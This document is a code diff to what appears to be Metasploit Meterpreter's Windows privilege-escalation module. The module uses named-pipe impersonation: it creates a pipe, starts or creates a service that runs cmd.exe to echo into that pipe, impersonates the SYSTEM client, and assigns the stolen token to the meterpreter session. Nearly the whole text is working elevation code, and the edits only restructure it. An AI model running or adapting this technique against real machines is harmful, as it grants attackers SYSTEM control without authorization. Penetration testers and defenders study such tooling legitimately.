@@ -4,61 +4,41 @@
 #include "service.h"
 
 /*
- * A post-impersonation callback that simply updates the meterpreter token to the
- * current thread token. This is used by the standard service-based technique.
- */
-DWORD post_callback_use_self(Remote * remote)
-{
-	HANDLE hToken = NULL;
-
-	// get a handle to this threads token
-	if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &hToken)) {
-		dprintf("[ELEVATE] post_callback_use_self. OpenThreadToken failed");
-		return GetLastError();
-	}
-
-	// now we can set the meterpreters thread token to that of our system
-	// token so all subsequent meterpreter threads will use this token.
-	met_api->thread.update_token(remote, hToken);
-	return ERROR_SUCCESS;
-}
-
-/*
  * Worker thread for named pipe impersonation. Creates a named pipe and impersonates
  * the first client which connects to it.
  */
 DWORD THREADCALL elevate_namedpipe_thread(THREAD * thread)
 {
-	DWORD dwResult                               = ERROR_ACCESS_DENIED;
-	HANDLE hPipe                                 = NULL;
-	HANDLE hSem                                  = NULL;
-	char * cpPipeName                            = NULL;
-	BYTE bMessage[128]                           = {0};
-	DWORD dwBytes                                = 0;
-	BOOL bImpersonated                           = FALSE;
-	PPRIV_POST_IMPERSONATION pPostImpersonation  = NULL;
+	DWORD dwResult              = ERROR_ACCESS_DENIED;
+	HANDLE hServerPipe          = NULL;
+	HANDLE hToken               = NULL;
+	HANDLE hSem		    = NULL;
+	char * cpServicePipe        = NULL;
+	Remote * remote             = NULL;
+	BYTE bMessage[128]          = {0};
+	DWORD dwBytes               = 0;
 
 	do {
 		if (!thread) {
 			BREAK_WITH_ERROR("[ELEVATE] elevate_namedpipe_thread. invalid thread", ERROR_BAD_ARGUMENTS);
 		}
 
-		cpPipeName         = (char *)thread->parameter1;
-		hSem               = (HANDLE)thread->parameter2;
-		pPostImpersonation = (PPRIV_POST_IMPERSONATION)thread->parameter3;
+		cpServicePipe = (char *)thread->parameter1;
+		remote        = (Remote *)thread->parameter2;
+		hSem          = (HANDLE)thread->parameter3;
 
-		if (!cpPipeName) {
+		if (!cpServicePipe || !remote) {
 			BREAK_WITH_ERROR("[ELEVATE] elevate_namedpipe_thread.  invalid thread arguments",
 				ERROR_BAD_ARGUMENTS);
 		}
 
-		dprintf("[ELEVATE] pipethread. CreateNamedPipe(%s)", cpPipeName);
+		dprintf("[ELEVATE] pipethread. CreateNamedPipe(%s)",cpServicePipe);
 
 		// create the named pipe for the client service to connect to
-		hPipe = CreateNamedPipe(cpPipeName,
+		hServerPipe = CreateNamedPipe(cpServicePipe,
 			PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE|PIPE_WAIT, 2, 0, 0, 0, NULL);
 
-		if (!hPipe) {
+		if (!hServerPipe) {
 			BREAK_ON_ERROR("[ELEVATE] elevate_namedpipe_thread. CreateNamedPipe failed");
 		}
 
@@ -68,55 +48,55 @@ DWORD THREADCALL elevate_namedpipe_thread(THREAD * thread)
 					ERROR_DBG_TERMINATE_THREAD);
 			}
 
-			// signal the client that the pipe is ready
-            if (hSem) {
-                if (!ReleaseSemaphore(hSem, 1, NULL)) {
-					BREAK_WITH_ERROR("[ELEVATE] elevate_namedpipe_thread. ReleaseSemaphore failed",
+			//signal the client that the pipe is ready
+                        if (hSem) {
+                                if (!ReleaseSemaphore(hSem, 1, NULL)) {
+				        BREAK_WITH_ERROR("[ELEVATE] elevate_namedpipe_thread. ReleaseSemaphore failed",
 						ERROR_DBG_TERMINATE_THREAD);
 				}
 			}
 
 			// wait for a client to connect to our named pipe...
-			if (!ConnectNamedPipe(hPipe, NULL)) {
+			if (!ConnectNamedPipe(hServerPipe, NULL)) {
 				if (GetLastError() != ERROR_PIPE_CONNECTED)
 					continue;
 			}
 
-			dprintf("[ELEVATE] elevate_namedpipe_thread. receieved a client connection");
+			dprintf("[ELEVATE] pipethread. got client conn.");
 
-			// we can't impersonate a client until we have performed a read on the pipe...
-			if (!ReadFile(hPipe, &bMessage, 1, &dwBytes, NULL)) {
-				DisconnectNamedPipe(hPipe);
+			// we can't impersonate a client untill we have performed a read on the pipe...
+			if (!ReadFile(hServerPipe, &bMessage, 1, &dwBytes, NULL)) {
 				CONTINUE_ON_ERROR("[ELEVATE] pipethread. ReadFile failed");
 			}
 
 			// impersonate the client!
-			bImpersonated = ImpersonateNamedPipeClient(hPipe);
-			DisconnectNamedPipe(hPipe);
-			if (!bImpersonated) {
+			if (!ImpersonateNamedPipeClient(hServerPipe)) {
 				CONTINUE_ON_ERROR("[ELEVATE] elevate_namedpipe_thread. ImpersonateNamedPipeClient failed");
 			}
 
-			if (pPostImpersonation) {
-				dprintf("[ELEVATE] elevate_namedpipe_thread. dispatching to the post impersonation callback");
-				dwResult = pPostImpersonation->pCallback(pPostImpersonation->pCallbackParam);
-				if (dwResult != ERROR_SUCCESS) {
-					RevertToSelf();
-					BREAK_ON_ERROR("[ELEVATE] elevate_namedpipe_thread. the post impersonation callback failed");
-				}
+			// get a handle to this threads token
+			if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &hToken)) {
+				CONTINUE_ON_ERROR("[ELEVATE] elevate_namedpipe_thread. OpenThreadToken failed");
 			}
-			else {
-				dwResult = ERROR_SUCCESS;
-			}
+
+			// now we can set the meterpreters thread token to that of our system
+			// token so all subsequent meterpreter threads will use this token.
+			met_api->thread.update_token(remote, hToken);
+
+			dwResult = ERROR_SUCCESS;
+
 			break;
 		}
+
 	} while (0);
 
-	if (hPipe) {
-		CLOSE_HANDLE(hPipe);
+	if (hServerPipe) {
+		DisconnectNamedPipe(hServerPipe);
+		CLOSE_HANDLE(hServerPipe);
 	}
 
 	dprintf("[ELEVATE] elevate_namedpipe_thread finishing, dwResult=%d", dwResult);
+
 	return dwResult;
 }
 
@@ -129,14 +109,13 @@ DWORD THREADCALL elevate_namedpipe_thread(THREAD * thread)
  */
 DWORD elevate_via_service_namedpipe(Remote * remote, Packet * packet)
 {
-	DWORD dwResult                            = ERROR_SUCCESS;
-	char * cpServiceName                      = NULL;
-	THREAD * pThread                          = NULL;
-	HANDLE hSem                               = NULL;
-	char cServiceArgs[MAX_PATH]               = {0};
-	char cServicePipe[MAX_PATH]               = {0};
-	OSVERSIONINFO os                          = {0};
-	PRIV_POST_IMPERSONATION PostImpersonation;
+	DWORD dwResult              = ERROR_SUCCESS;
+	char * cpServiceName        = NULL;
+	THREAD * pThread            = NULL;
+	HANDLE hSem                 = NULL;
+	char cServiceArgs[MAX_PATH] = {0};
+	char cServicePipe[MAX_PATH] = {0};
+	OSVERSIONINFO os            = {0};
 
 	do {
 		os.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
@@ -147,7 +126,7 @@ DWORD elevate_via_service_namedpipe(Remote * remote, Packet * packet)
 
 		// filter out Windows NT4
 		if (os.dwMajorVersion == 4 && os.dwMinorVersion == 0) {
-			SetLastError(ERROR_CALL_NOT_IMPLEMENTED);
+			SetLastError(ERROR_ACCESS_DENIED);
 			BREAK_ON_ERROR("[ELEVATE] elevate_via_service_namedpipe: Windows NT4 not supported.")
 		}
 
@@ -164,10 +143,7 @@ DWORD elevate_via_service_namedpipe(Remote * remote, Packet * packet)
 			"cmd.exe /c echo %s > %s", cpServiceName, cServicePipe);
 
 		hSem = CreateSemaphore(NULL, 0, 1, NULL);
-		PostImpersonation.pCallback = post_callback_use_self;
-		PostImpersonation.pCallbackParam = remote;
-
-		pThread = met_api->thread.create(elevate_namedpipe_thread, &cServicePipe, hSem, &PostImpersonation);
+		pThread = met_api->thread.create(elevate_namedpipe_thread, &cServicePipe, remote, hSem);
 		if (!pThread) {
 			BREAK_WITH_ERROR("[ELEVATE] elevate_via_service_namedpipe. met_api->thread.create failed",
 				ERROR_INVALID_HANDLE);
@@ -178,24 +154,24 @@ DWORD elevate_via_service_namedpipe(Remote * remote, Packet * packet)
 				ERROR_ACCESS_DENIED);
 		}
 
-		// wait for the thread to create the pipe, if it times out terminate
-        if (hSem) {
-		    if (WaitForSingleObject(hSem, 500) != WAIT_OBJECT_0) {
-			    BREAK_WITH_ERROR("[ELEVATE] elevate_via_service_namedpipe. WaitForSingleObject failed",
+		//wait for the thread to create the pipe(if it times out terminate)
+                if (hSem) {
+		        if (WaitForSingleObject(hSem, 500) != WAIT_OBJECT_0) {
+			        BREAK_WITH_ERROR("[ELEVATE] elevate_via_service_namedpipe. WaitForSingleObject failed",
 					ERROR_ACCESS_DENIED);
 			}
-        } else {
-            Sleep(500);
+                } else {
+                        Sleep(500);
 		}
 
-		// start the elevator service (if it doesn't start first time we need to create it and then start it).
+		// start the elevator service (if it doesnt start first time we need to create it and then start it).
 		if (service_start(cpServiceName) != ERROR_SUCCESS) {
 			dprintf("[ELEVATE] service starting failed, attempting to create");
 			if (service_create(cpServiceName, cServiceArgs) != ERROR_SUCCESS) {
 				BREAK_ON_ERROR("[ELEVATE] elevate_via_service_namedpipe. service_create failed");
 			}
 			dprintf("[ELEVATE] creation of service succeeded, attempting to start");
-			// we don't check a return value for service_start as we expect it to fail as cmd.exe is not
+			// we dont check a return value for service_start as we expect it to fail as cmd.exe is not
 			// a valid service and it will never signal to the service manager that is is a running service.
 			service_start(cpServiceName);
 		}
@@ -240,21 +216,20 @@ DWORD elevate_via_service_namedpipe(Remote * remote, Packet * packet)
  */
 DWORD elevate_via_service_namedpipe2(Remote * remote, Packet * packet)
 {
-	DWORD dwResult                            = ERROR_SUCCESS;
-	THREAD * pThread                          = NULL;
-	HANDLE hServiceFile                       = NULL;
-	HANDLE hSem                               = NULL;
-	LPVOID lpServiceBuffer                    = NULL;
-	char * cpServiceName                      = NULL;
-	THREAD * pthread                          = NULL;
-	char cServicePath[MAX_PATH]               = {0};
-	char cServiceArgs[MAX_PATH]               = {0};
-	char cServicePipe[MAX_PATH]               = {0};
-	char cTempPath[MAX_PATH]                  = {0};
-	DWORD dwBytes                             = 0;
-	DWORD dwTotal                             = 0;
-	DWORD dwServiceLength                     = 0;
-	PRIV_POST_IMPERSONATION PostImpersonation;
+	DWORD dwResult              = ERROR_SUCCESS;
+	THREAD * pThread            = NULL;
+	HANDLE hServiceFile         = NULL;
+	HANDLE hSem		    = NULL;
+	LPVOID lpServiceBuffer      = NULL;
+	char * cpServiceName        = NULL;
+	THREAD * pthread            = NULL;
+	char cServicePath[MAX_PATH] = {0};
+	char cServiceArgs[MAX_PATH] = {0};
+	char cServicePipe[MAX_PATH] = {0};
+	char cTempPath[MAX_PATH]    = {0};
+	DWORD dwBytes               = 0;
+	DWORD dwTotal               = 0;
+	DWORD dwServiceLength       = 0;
 
 	do
 	{
@@ -304,10 +279,7 @@ DWORD elevate_via_service_namedpipe2(Remote * remote, Packet * packet)
 		}
 
 		hSem = CreateSemaphore(NULL, 0, 1, NULL);
-		PostImpersonation.pCallback = post_callback_use_self;
-		PostImpersonation.pCallbackParam = remote;
-
-		pThread = met_api->thread.create(elevate_namedpipe_thread, &cServicePipe, hSem, &PostImpersonation);
+		pThread = met_api->thread.create(elevate_namedpipe_thread, &cServicePipe, remote, hSem);
 		if (!pThread) {
 			BREAK_WITH_ERROR("[ELEVATE] elevate_via_service_namedpipe2. met_api->thread.create failed",
 				ERROR_INVALID_HANDLE);
@@ -319,13 +291,12 @@ DWORD elevate_via_service_namedpipe2(Remote * remote, Packet * packet)
 		}
 
 		//wait for the thread to create the pipe(if it times out terminate)
-        if (hSem) {
-			if (WaitForSingleObject(hSem, 500) != WAIT_OBJECT_0) {
-				BREAK_WITH_ERROR("[ELEVATE] elevate_via_service_namedpipe2. WaitForSingleObject failed",
+                if (hSem) {
+                        if (WaitForSingleObject(hSem, 500) != WAIT_OBJECT_0)
+			        BREAK_WITH_ERROR("[ELEVATE] elevate_via_service_namedpipe2. WaitForSingleObject failed",
 					ERROR_ACCESS_DENIED);
-			}
-        } else {
-                Sleep(500);
+                } else {
+                        Sleep(500);
 		}
 
 		// start the elevator service (if it doesnt start first time we need to create it and then start it).
